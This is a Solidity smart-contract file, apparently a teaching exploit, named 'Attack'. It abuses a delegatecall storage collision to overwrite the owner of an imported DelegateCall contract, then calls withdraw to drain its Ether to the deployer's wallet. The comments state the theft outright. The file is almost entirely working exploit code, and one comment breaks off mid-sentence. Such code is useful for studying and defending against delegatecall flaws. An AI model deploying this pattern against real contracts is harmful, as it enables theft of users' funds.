//SPDX.License.Identifier:MIT

pragma solidity ^0.8.0;

import "./DelegateCall.sol";
import "./Logic.sol";

contract Attack{
    Logic public logic;
    address public owner;
    uint public num;
    DelegateCall public delegatecall;
    uint public addr = uint(uint160(address(this)));
    address payable public admin;

    constructor(address payable _attackAddress){
        delegatecall = DelegateCall(_attackAddress);
        admin = payable(msg.sender);
    }
    function attack() public{
        address(delegatecall).call(abi.encodeWithSignature("changeNum(uint256)",addr));
    }
    function changeNum(uint) public{
        // owner = payable(tx.origin);              // Deployer of Attack becomes owner.
        owner = msg.sender;                         // Attack contract becomes owner. Since we w
    }
    function getAllEther() public{
        delegatecall.withdraw();                    // Attack contract becomes owner so eligible to steal Ether from DelegateCall contract.
    } 
    function takeawayEther() public{
        admin.transfer(address(this).balance);      // Attacker takes all Ether from Attack contract to wallet.
    }
    receive() external payable{}                    // Mandatory function To make Attack contract eligible to receive Ether. ( With no call data ) 
}